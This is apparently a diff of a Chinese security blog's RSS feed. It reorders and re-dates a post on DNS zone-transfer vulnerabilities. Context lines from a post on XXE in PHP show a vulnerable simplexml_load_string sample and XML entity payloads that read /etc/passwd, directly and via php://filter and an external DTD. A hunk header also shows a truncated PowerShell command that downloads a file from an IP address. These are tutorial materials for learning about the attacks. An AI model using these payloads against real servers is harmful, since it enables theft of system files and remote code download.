@@ -6,21 +6,10 @@
     <description>Recent content on </description>
     <generator>Hugo -- gohugo.io</generator>
     <language>en-us</language>
-    <lastBuildDate>Tue, 14 Aug 2018 13:58:33 +0800</lastBuildDate>
+    <lastBuildDate>Mon, 23 Jul 2018 00:09:17 +0800</lastBuildDate>
     
 	<atom:link href="http://wyb0.com/index.xml" rel="self" type="application/rss+xml" />
     
-    
-    <item>
-      <title>DNS域传送漏洞</title>
-      <link>http://wyb0.com/posts/dns-zone-transfer/</link>
-      <pubDate>Tue, 14 Aug 2018 13:58:33 +0800</pubDate>
-      
-      <guid>http://wyb0.com/posts/dns-zone-transfer/</guid>
-      <description> 0x00 DNS域传送 DNS服务器分为：主服务器、备份服务器和缓存服务器，在主备服务器之间则通过“DNS域传送”同步数据。
-若DNS服务器配置不当，可能导致匿名用户获取某个域的所有记录，从而节省许多搜集资产的时间。
-0x01 通过nslookup查看域传送漏洞 分为3步：1. 设置type为ns；2. 查询ns服务器；3. 设置ns服务器 0x02 通过dig查看域传送漏洞 0x03 通过nmap查看域传送漏洞 </description>
-    </item>
     
     <item>
       <title>关于PHP SESSION反序列化</title>
@@ -140,6 +129,17 @@ powershell (new-object System.Net.WebClient).DownloadFile(&amp;quot;http://114.1
 0x01 示例代码 实验环境：https://github.com/vulhub/vulhub/tree/master/php/php_xxe
 simplexml_load_string.php
 &amp;lt;?php $data = file_get_contents(&#39;php://input&#39;); $xml = simplexml_load_string($data); echo $xml-&amp;gt;name;  0x02 读取文件  外部引用读取passwd  &amp;lt;?xml version=&amp;quot;1.0&amp;quot; encoding=&amp;quot;utf-8&amp;quot;?&amp;gt; &amp;lt;!DOCTYPE xdsec [ &amp;lt;!ELEMENT name ANY &amp;gt; &amp;lt;!ENTITY xxe SYSTEM &amp;quot;file:///etc/passwd&amp;quot;&amp;gt; ]&amp;gt; &amp;lt;root&amp;gt; &amp;lt;name&amp;gt;&amp;amp;xxe;&amp;lt;/name&amp;gt; &amp;lt;/root&amp;gt;  &amp;lt;?xml version=&amp;quot;1.0&amp;quot; encoding=&amp;quot;utf-8&amp;quot;?&amp;gt; &amp;lt;!DOCTYPE xdsec [ &amp;lt;!ELEMENT name ANY &amp;gt; &amp;lt;!ENTITY xxe SYSTEM &amp;quot;php://filter/read=convert.base64-encode/resource=/etc/passwd&amp;quot;&amp;gt; ]&amp;gt; &amp;lt;root&amp;gt; &amp;lt;name&amp;gt;&amp;amp;xxe;&amp;lt;/name&amp;gt; &amp;lt;/root&amp;gt;   外部引用dtd文件读取passwd  evil.dtd中的内容为：&amp;lt;!ENTITY b SYSTEM &amp;quot;file:///etc/passwd&amp;quot;&amp;gt;</description>
+    </item>
+    
+    <item>
+      <title>DNS域传送漏洞</title>
+      <link>http://wyb0.com/posts/dns-zone-transfer/</link>
+      <pubDate>Mon, 20 Nov 2017 13:58:33 +0800</pubDate>
+      
+      <guid>http://wyb0.com/posts/dns-zone-transfer/</guid>
+      <description> 0x00 DNS域传送 DNS服务器分为：主服务器、备份服务器和缓存服务器，在主备服务器之间则通过“DNS域传送”同步数据。
+若DNS服务器配置不当，可能导致匿名用户获取某个域的所有记录，从而节省许多搜集资产的时间。
+0x01 通过nslookup查看域传送漏洞 分为3步：1. 设置type为ns；2. 查询ns服务器；3. 设置ns服务器 0x02 通过dig查看域传送漏洞 0x03 通过nmap查看域传送漏洞 </description>
     </item>
     
     <item>
